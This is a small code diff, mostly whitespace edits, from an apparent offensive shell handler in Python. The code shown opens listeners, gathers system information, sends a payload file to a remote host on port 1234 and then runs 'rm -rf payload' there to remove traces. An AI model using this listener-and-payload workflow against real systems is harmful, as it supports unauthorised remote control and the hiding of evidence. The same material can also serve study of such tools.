@@ -161,9 +161,7 @@ class LocalShell(cmd.Cmd):
             host, port = line.strip().split(" ")
 
         sock = listen(host, port, 0)
-
         if not sock: return
-
         sock.sysinfo = SystemInfoGatherer()
         # sock.sysinfo.binaryGatherer(sock)
 
@@ -181,13 +179,11 @@ class LocalShell(cmd.Cmd):
             # TODO: add a check that confirms that netcat is running if not just skip 
             sock.server_socket.close()
             sock.client_socket.close()
-
             send_file(os.path.join(PROJ_DIR, "payloads/payload"), host, 1234)
             logging.info(f"Payload sent. Starting listener..")
+            
             sock = listen(host, port, 1)
-            
             if not sock: return
-            
             sock.send_command("rm -rf payload")
         else:
             logging.error("Fail to sent payload. Using shell as client.")
